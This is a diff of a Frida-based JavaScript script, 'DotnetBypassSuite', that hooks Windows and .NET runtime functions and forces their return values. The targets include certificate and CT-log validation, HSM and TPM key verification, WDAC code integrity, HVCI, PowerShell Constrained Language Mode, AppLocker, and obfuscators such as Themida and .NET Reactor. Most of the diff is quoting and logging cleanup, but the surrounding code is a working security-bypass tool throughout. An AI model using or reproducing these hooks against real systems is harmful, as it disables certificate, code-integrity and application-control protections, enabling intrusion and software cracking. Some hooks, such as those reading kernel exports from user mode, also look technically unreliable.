+                            action: 'native_aot_runtime_detected',
                             address: match.address.toString()
                         });
                     },
@@ -1234,9 +1279,9 @@ const DotnetBypassSuite = {
                             retval.replace(0); // Force success
                             self.stats.nativeAotBypassEvents++;
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "native_aot_security_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'native_aot_security_bypassed'
                             });
                         }
                     }
@@ -1245,16 +1290,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook NativeAOT reflection restrictions
-        var reflectionPattern = "48 8B 01 FF 50 ?? 85 C0 74 ?? 48 8B CB E8 ?? ?? ?? ?? 48 8B C8";
-        var reflectionMatches = Memory.scanSync(Module.getBaseAddress("kernel32.dll"), Module.getSize("kernel32.dll"), reflectionPattern);
+        var reflectionPattern = '48 8B 01 FF 50 ?? 85 C0 74 ?? 48 8B CB E8 ?? ?? ?? ?? 48 8B C8';
+        var reflectionMatches = Memory.scanSync(Module.getBaseAddress('kernel32.dll'), Module.getSize('kernel32.dll'), reflectionPattern);
 
         reflectionMatches.forEach(function(match) {
             Interceptor.attach(match.address, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "native_aot_reflection_restriction_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'native_aot_reflection_restriction_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1263,9 +1308,9 @@ const DotnetBypassSuite = {
                         retval.replace(1);
                         self.stats.nativeAotBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "native_aot_reflection_restriction_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'native_aot_reflection_restriction_bypassed'
                         });
                     }
                 }
@@ -1280,7 +1325,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Single-file deployments extract to temp directory
-        var tempExtractPattern = "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 E8 ?? ?? ?? ?? 85 C0";
+        var tempExtractPattern = '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 E8 ?? ?? ?? ?? 85 C0';
         var extractMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, tempExtractPattern);
 
         extractMatches.forEach(function(match) {
@@ -1290,9 +1335,9 @@ const DotnetBypassSuite = {
                     if (extractPath && !extractPath.isNull()) {
                         var path = extractPath.readUtf16String();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "single_file_extraction_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'single_file_extraction_detected',
                             extract_path: path
                         });
                     }
@@ -1303,9 +1348,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.trimmingSingleFileBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "single_file_extraction_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'single_file_extraction_bypassed'
                         });
                     }
                 }
@@ -1313,16 +1358,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook trimming metadata validation
-        var trimmingPattern = "48 8B 42 ?? 48 85 C0 74 ?? 48 8B 48 ?? 48 85 C9 74";
+        var trimmingPattern = '48 8B 42 ?? 48 85 C0 74 ?? 48 8B 48 ?? 48 85 C9 74';
         var trimmingMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, trimmingPattern);
 
         trimmingMatches.forEach(function(match) {
             Interceptor.attach(match.address, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "trimming_metadata_validation_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'trimming_metadata_validation_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1332,9 +1377,9 @@ const DotnetBypassSuite = {
                         retval.replace(ptr(0x1000));
                         self.stats.trimmingSingleFileBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "trimming_metadata_validation_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'trimming_metadata_validation_bypassed'
                         });
                     }
                 }
@@ -1342,7 +1387,7 @@ const DotnetBypassSuite = {
         });
 
         // Hook bundled resource access
-        var bundlePattern = "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 56 41 57 48 83 EC ?? 4C 8B F2";
+        var bundlePattern = '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 56 41 57 48 83 EC ?? 4C 8B F2';
         var bundleMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, bundlePattern);
 
         bundleMatches.forEach(function(match) {
@@ -1352,9 +1397,9 @@ const DotnetBypassSuite = {
                     if (resourceName && !resourceName.isNull()) {
                         var name = resourceName.readUtf16String();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "bundled_resource_access_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'bundled_resource_access_detected',
                             resource_name: name
                         });
                     }
@@ -1378,20 +1423,20 @@ const DotnetBypassSuite = {
         var self = this;
 
         // R2R images have pre-compiled native code
-        var r2rHeaderPattern = "52 32 52 00"; // "R2R\0" signature
+        var r2rHeaderPattern = '52 32 52 00'; // "R2R\0" signature
         var r2rMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, r2rHeaderPattern);
 
         r2rMatches.forEach(function(match) {
             send({
-                type: "info",
-                target: "dotnet_bypass_suite",
-                action: "r2r_image_detected",
+                type: 'info',
+                target: 'dotnet_bypass_suite',
+                action: 'r2r_image_detected',
                 address: match.address.toString()
             });
         });
 
         // Hook R2R method resolution
-        var r2rMethodPattern = "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 E8 ?? ?? ?? ?? 48 85 C0 75";
+        var r2rMethodPattern = '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 E8 ?? ?? ?? ?? 48 85 C0 75';
         var methodMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, r2rMethodPattern);
 
         methodMatches.forEach(function(match) {
@@ -1400,9 +1445,9 @@ const DotnetBypassSuite = {
                     var methodToken = args[1];
                     if (methodToken) {
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "r2r_method_resolution_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'r2r_method_resolution_detected',
                             method_token: methodToken.toString(16)
                         });
                     }
@@ -1414,9 +1459,9 @@ const DotnetBypassSuite = {
                         retval.replace(ptr(0x3000));
                         self.stats.readyToRunBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "r2r_method_resolution_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'r2r_method_resolution_bypassed'
                         });
                     }
                 }
@@ -1424,16 +1469,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook R2R fixup processing
-        var fixupPattern = "41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8";
+        var fixupPattern = '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8';
         var fixupMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, fixupPattern);
 
         fixupMatches.forEach(function(match) {
             Interceptor.attach(match.address, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "r2r_fixup_processing_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'r2r_fixup_processing_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1442,9 +1487,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.readyToRunBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "r2r_fixup_processing_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'r2r_fixup_processing_bypassed'
                         });
                     }
                 }
@@ -1459,30 +1504,30 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Blazor WebAssembly runtime patterns
-        var blazorModules = ["mono-wasm", "dotnet.wasm", "blazor.boot"];
-        
+        var blazorModules = ['mono-wasm', 'dotnet.wasm', 'blazor.boot'];
+
         blazorModules.forEach(function(moduleName) {
             try {
                 var module = Module.findBaseAddress(moduleName);
                 if (module && !module.isNull()) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "blazor_wasm_runtime_detected",
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'blazor_wasm_runtime_detected',
                         module_name: moduleName
                     });
 
                     // Hook Mono WebAssembly initialization
-                    var monoWasmPattern = "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B EA";
+                    var monoWasmPattern = '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9 48 8B EA';
                     var wasmMatches = Memory.scanSync(module, Module.getSize(moduleName), monoWasmPattern);
 
                     wasmMatches.forEach(function(match) {
                         Interceptor.attach(match.address, {
                             onEnter: function(args) {
                                 send({
-                                    type: "info",
-                                    target: "dotnet_bypass_suite",
-                                    action: "mono_wasm_init_detected"
+                                    type: 'info',
+                                    target: 'dotnet_bypass_suite',
+                                    action: 'mono_wasm_init_detected'
                                 });
                             },
                             onLeave: function(retval) {
@@ -1491,9 +1536,9 @@ const DotnetBypassSuite = {
                                     retval.replace(0);
                                     self.stats.wasmBlazorNetRuntimeBypassEvents++;
                                     send({
-                                        type: "bypass",
-                                        target: "dotnet_bypass_suite",
-                                        action: "mono_wasm_init_bypassed"
+                                        type: 'bypass',
+                                        target: 'dotnet_bypass_suite',
+                                        action: 'mono_wasm_init_bypassed'
                                     });
                                 }
                             }
@@ -1506,7 +1551,7 @@ const DotnetBypassSuite = {
         });
 
         // Hook JavaScript interop security
-        var jsInteropPattern = "JS_Call";
+        var jsInteropPattern = 'JS_Call';
         try {
             var jsCall = Module.findExportByName(null, jsInteropPattern);
             if (jsCall) {
@@ -1516,9 +1561,9 @@ const DotnetBypassSuite = {
                         if (functionName && !functionName.isNull()) {
                             var name = functionName.readUtf8String();
                             send({
-                                type: "info",
-                                target: "dotnet_bypass_suite",
-                                action: "js_interop_call_detected",
+                                type: 'info',
+                                target: 'dotnet_bypass_suite',
+                                action: 'js_interop_call_detected',
                                 function_name: name
                             });
                         }
@@ -1533,19 +1578,28 @@ const DotnetBypassSuite = {
                 });
                 this.stats.methodsHooked++;
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         // Hook Blazor component security restrictions
-        var componentPattern = "blazor_component_";
+        var componentPattern = 'blazor_component_';
         Process.enumerateModules().forEach(function(module) {
             module.enumerateExports().forEach(function(exp) {
                 if (exp.name.includes(componentPattern)) {
                     Interceptor.attach(exp.address, {
                         onEnter: function(args) {
                             send({
-                                type: "info",
-                                target: "dotnet_bypass_suite",
-                                action: "blazor_component_security_check",
+                                type: 'info',
+                                target: 'dotnet_bypass_suite',
+                                action: 'blazor_component_security_check',
                                 export_name: exp.name
                             });
                         },
@@ -1569,7 +1623,7 @@ const DotnetBypassSuite = {
 
         // DNGuard HVM patterns
         var dnguardPatterns = [
-            "DNGuard", "HVM", "DNG_", "48 8D 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 84"
+            'DNGuard', 'HVM', 'DNG_', '48 8D 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 84'
         ];
 
         dnguardPatterns.forEach(function(pattern) {
@@ -1578,9 +1632,9 @@ const DotnetBypassSuite = {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "dnguard_hvm_detected",
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'dnguard_hvm_detected',
                             address: match.address.toString()
                         });
                     },
@@ -1595,8 +1649,8 @@ const DotnetBypassSuite = {
 
         // .NET Reactor v6 patterns
         var reactorV6Patterns = [
-            "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC",
-            "Reactor", "NETReactor", "NecroBit"
+            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC',
+            'Reactor', 'NETReactor', 'NecroBit'
         ];
 
         reactorV6Patterns.forEach(function(pattern) {
@@ -1610,9 +1664,9 @@ const DotnetBypassSuite = {
                     }
                 });
                 send({
-                    type: "bypass",
-                    target: "dotnet_bypass_suite",
-                    action: "net_reactor_v6_patched",
+                    type: 'bypass',
+                    target: 'dotnet_bypass_suite',
+                    action: 'net_reactor_v6_patched',
                     address: match.address.toString()
                 });
                 self.stats.modernObfuscatorSupportEvents++;
@@ -1621,18 +1675,18 @@ const DotnetBypassSuite = {
 
         // Themida .NET patterns
         var themidaNetPatterns = [
-            "Themida", "WinLicense", "48 8B C4 48 89 58 ?? 48 89 68 ?? 48 89 70 ?? 48 89 78 ?? 41 54 41 55 41 56 41 57 48 83 EC"
+            'Themida', 'WinLicense', '48 8B C4 48 89 58 ?? 48 89 68 ?? 48 89 70 ?? 48 89 78 ?? 41 54 41 55 41 56 41 57 48 83 EC'
         ];
 
         themidaNetPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("kernel32.dll"), Module.getSize("kernel32.dll"), pattern);
+            var matches = Memory.scanSync(Module.getBaseAddress('kernel32.dll'), Module.getSize('kernel32.dll'), pattern);
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "themida_net_detected",
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'themida_net_detected',
                             address: match.address.toString()
                         });
                     },
@@ -1648,7 +1702,7 @@ const DotnetBypassSuite = {
         });
 
         // Hook modern control flow obfuscation
-        var cfoPattern = "48 8D 05 ?? ?? ?? ?? 48 8B 0C ?? 48 FF E1";
+        var cfoPattern = '48 8D 05 ?? ?? ?? ?? 48 8B 0C ?? 48 FF E1';
         var cfoMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, cfoPattern);
 
         cfoMatches.forEach(function(match) {
@@ -1659,9 +1713,9 @@ const DotnetBypassSuite = {
                 code.putU8(0xC3); // ret
             });
             send({
-                type: "bypass",
-                target: "dotnet_bypass_suite",
-                action: "control_flow_obfuscation_deobfuscated",
+                type: 'bypass',
+                target: 'dotnet_bypass_suite',
+                action: 'control_flow_obfuscation_deobfuscated',
                 address: match.address.toString()
             });
             self.stats.modernObfuscatorSupportEvents++;
@@ -1676,22 +1730,22 @@ const DotnetBypassSuite = {
 
         // Hook certificate validation with CT log verification
         var ctLogPatterns = [
-            "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 48 8B 0D",
-            "41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0"
+            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B FA 48 8B F1 48 8B 0D',
+            '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0'
         ];
 
         ctLogPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("crypt32.dll"), Module.getSize("crypt32.dll"), pattern);
-            
+            var matches = Memory.scanSync(Module.getBaseAddress('crypt32.dll'), Module.getSize('crypt32.dll'), pattern);
+
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         var certContext = args[0];
                         if (certContext && !certContext.isNull()) {
                             send({
-                                type: "info",
-                                target: "dotnet_bypass_suite",
-                                action: "certificate_ct_log_verification_detected"
+                                type: 'info',
+                                target: 'dotnet_bypass_suite',
+                                action: 'certificate_ct_log_verification_detected'
                             });
                         }
                     },
@@ -1701,9 +1755,9 @@ const DotnetBypassSuite = {
                             retval.replace(1);
                             self.stats.certificateTransparencyLogDotNetBypassEvents++;
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "certificate_ct_log_verification_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'certificate_ct_log_verification_bypassed'
                             });
                         }
                     }
@@ -1712,16 +1766,16 @@ const DotnetBypassSuite = {
         });
 
         // Hook .NET specific certificate chain validation with CT
-        var dotNetCertPattern = "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4D 8B E1";
+        var dotNetCertPattern = '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 4D 8B E1';
         var dotNetMatches = Memory.scanSync(self.clrModule.base, self.clrModule.size, dotNetCertPattern);
 
         dotNetMatches.forEach(function(match) {
             Interceptor.attach(match.address, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "dotnet_certificate_chain_validation_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'dotnet_certificate_chain_validation_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1730,9 +1784,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.certificateTransparencyLogDotNetBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "dotnet_certificate_chain_validation_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'dotnet_certificate_chain_validation_bypassed'
                         });
                     }
                 }
@@ -1747,7 +1801,7 @@ const DotnetBypassSuite = {
         var self = this;
 
         // Hook PKCS#11 interface for HSM communication
-        var pkcs11Pattern = "C_GetSlotList";
+        var pkcs11Pattern = 'C_GetSlotList';
         try {
             var pkcs11Func = Module.findExportByName(null, pkcs11Pattern);
             if (pkcs11Func) {
@@ -1755,9 +1809,9 @@ const DotnetBypassSuite = {
                     onEnter: function(args) {
                         var tokenPresent = args[0].toInt32();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "hsm_pkcs11_get_slot_list_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'hsm_pkcs11_get_slot_list_detected',
                             token_present: tokenPresent
                         });
                     },
@@ -1766,18 +1820,27 @@ const DotnetBypassSuite = {
                         retval.replace(0); // CKR_OK
                         self.stats.hsmCertificateBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "hsm_pkcs11_get_slot_list_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'hsm_pkcs11_get_slot_list_bypassed'
                         });
                     }
                 });
                 this.stats.methodsHooked++;
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         // Hook HSM certificate verification
-        var hsmVerifyPattern = "C_Verify";
+        var hsmVerifyPattern = 'C_Verify';
         try {
             var hsmVerify = Module.findExportByName(null, hsmVerifyPattern);
             if (hsmVerify) {
@@ -1786,9 +1849,9 @@ const DotnetBypassSuite = {
                         var session = args[0];
                         var signature = args[1];
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "hsm_certificate_verification_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'hsm_certificate_verification_detected',
                             session: session.toString(16)
                         });
                     },
@@ -1797,19 +1860,28 @@ const DotnetBypassSuite = {
                         retval.replace(0); // CKR_OK
                         self.stats.hsmCertificateBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "hsm_certificate_verification_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'hsm_certificate_verification_bypassed'
                         });
                     }
                 });
                 this.stats.methodsHooked++;
             }
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         // Hook Windows CNG HSM provider
-        var cngHsmPattern = "NCryptOpenKey";
-        var cngHsm = Module.findExportByName("ncrypt.dll", cngHsmPattern);
+        var cngHsmPattern = 'NCryptOpenKey';
+        var cngHsm = Module.findExportByName('ncrypt.dll', cngHsmPattern);
         if (cngHsm) {
             Interceptor.attach(cngHsm, {
                 onEnter: function(args) {
@@ -1818,9 +1890,9 @@ const DotnetBypassSuite = {
                     if (keyName && !keyName.isNull()) {
                         var name = keyName.readUtf16String();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "cng_hsm_key_access_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'cng_hsm_key_access_detected',
                             key_name: name
                         });
                     }
@@ -1831,9 +1903,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.hsmCertificateBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "cng_hsm_key_access_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'cng_hsm_key_access_bypassed'
                         });
                     }
                 }
@@ -1842,15 +1914,15 @@ const DotnetBypassSuite = {
         }
 
         // Hook TPM-based certificate storage
-        var tpmPattern = "Tbsi_GetDeviceInfo";
-        var tpm = Module.findExportByName("tbs.dll", tpmPattern);
+        var tpmPattern = 'Tbsi_GetDeviceInfo';
+        var tpm = Module.findExportByName('tbs.dll', tpmPattern);
         if (tpm) {
             Interceptor.attach(tpm, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "tpm_certificate_access_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'tpm_certificate_access_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1859,9 +1931,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.hsmCertificateBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "tpm_certificate_access_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'tpm_certificate_access_bypassed'
                         });
                     }
                 }
@@ -1876,22 +1948,22 @@ const DotnetBypassSuite = {
 
         // Hook WDAC policy enforcement
         var wdacPatterns = [
-            "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 45 33 FF",
-            "41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 85"
+            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 83 EC ?? 45 33 FF',
+            '41 56 48 83 EC ?? 4C 8B F2 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 0F 85'
         ];
 
         wdacPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("ci.dll"), Module.getSize("ci.dll"), pattern);
-            
+            var matches = Memory.scanSync(Module.getBaseAddress('ci.dll'), Module.getSize('ci.dll'), pattern);
+
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         var policyPtr = args[0];
                         if (policyPtr && !policyPtr.isNull()) {
                             send({
-                                type: "info",
-                                target: "dotnet_bypass_suite",
-                                action: "wdac_policy_enforcement_detected"
+                                type: 'info',
+                                target: 'dotnet_bypass_suite',
+                                action: 'wdac_policy_enforcement_detected'
                             });
                         }
                     },
@@ -1901,9 +1973,9 @@ const DotnetBypassSuite = {
                             retval.replace(0);
                             self.stats.windowsDefenderApplicationControlBypassEvents++;
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "wdac_policy_enforcement_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'wdac_policy_enforcement_bypassed'
                             });
                         }
                     }
@@ -1912,8 +1984,8 @@ const DotnetBypassSuite = {
         });
 
         // Hook WDAC code integrity checks
-        var ciCheckPattern = "CiCheckSignedFile";
-        var ciCheck = Module.findExportByName("ci.dll", ciCheckPattern);
+        var ciCheckPattern = 'CiCheckSignedFile';
+        var ciCheck = Module.findExportByName('ci.dll', ciCheckPattern);
         if (ciCheck) {
             Interceptor.attach(ciCheck, {
                 onEnter: function(args) {
@@ -1922,9 +1994,9 @@ const DotnetBypassSuite = {
                     if (fileName && !fileName.isNull()) {
                         var name = fileName.readUtf16String();
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "wdac_code_integrity_check_detected",
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'wdac_code_integrity_check_detected',
                             file_name: name
                         });
                     }
@@ -1935,9 +2007,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.windowsDefenderApplicationControlBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "wdac_code_integrity_check_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'wdac_code_integrity_check_bypassed'
                         });
                     }
                 }
@@ -1946,15 +2018,15 @@ const DotnetBypassSuite = {
         }
 
         // Hook HVCI (Hypervisor-protected Code Integrity)
-        var hvciPattern = "HvciSetInternalProperties";
-        var hvci = Module.findExportByName("ntoskrnl.exe", hvciPattern);
+        var hvciPattern = 'HvciSetInternalProperties';
+        var hvci = Module.findExportByName('ntoskrnl.exe', hvciPattern);
         if (hvci) {
             Interceptor.attach(hvci, {
                 onEnter: function(args) {
                     send({
-                        type: "info",
-                        target: "dotnet_bypass_suite",
-                        action: "hvci_enforcement_detected"
+                        type: 'info',
+                        target: 'dotnet_bypass_suite',
+                        action: 'hvci_enforcement_detected'
                     });
                 },
                 onLeave: function(retval) {
@@ -1963,9 +2035,9 @@ const DotnetBypassSuite = {
                         retval.replace(0);
                         self.stats.windowsDefenderApplicationControlBypassEvents++;
                         send({
-                            type: "bypass",
-                            target: "dotnet_bypass_suite",
-                            action: "hvci_enforcement_bypassed"
+                            type: 'bypass',
+                            target: 'dotnet_bypass_suite',
+                            action: 'hvci_enforcement_bypassed'
                         });
                     }
                 }
@@ -1982,21 +2054,21 @@ const DotnetBypassSuite = {
 
         // Hook PowerShell Constrained Language Mode enforcement
         var clmPatterns = [
-            "System.Management.Automation.LanguageMode",
-            "ConstrainedLanguage",
-            "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC"
+            'System.Management.Automation.LanguageMode',
+            'ConstrainedLanguage',
+            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57 48 81 EC'
         ];
 
         clmPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("System.Management.Automation.dll"), Module.getSize("System.Management.Automation.dll"), pattern);
-            
+            var matches = Memory.scanSync(Module.getBaseAddress('System.Management.Automation.dll'), Module.getSize('System.Management.Automation.dll'), pattern);
+
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
                         send({
-                            type: "info",
-                            target: "dotnet_bypass_suite",
-                            action: "powershell_clm_enforcement_detected"
+                            type: 'info',
+                            target: 'dotnet_bypass_suite',
+                            action: 'powershell_clm_enforcement_detected'
                         });
                     },
                     onLeave: function(retval) {
@@ -2005,9 +2077,9 @@ const DotnetBypassSuite = {
                             retval.replace(0); // FullLanguage
                             self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "powershell_clm_enforcement_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'powershell_clm_enforcement_bypassed'
                             });
                         }
                     }
@@ -2017,13 +2089,13 @@ const DotnetBypassSuite = {
 
         // Hook AppLocker .NET assembly restrictions
         var applockerPatterns = [
-            "48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 48 8B 0D",
-            "41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0"
+            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B F9 48 8B 0D',
+            '41 57 48 83 EC ?? 4C 8B F9 48 8B D1 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0'
         ];
 
         applockerPatterns.forEach(function(pattern) {
-            var matches = Memory.scanSync(Module.getBaseAddress("appid.dll"), Module.getSize("appid.dll"), pattern);
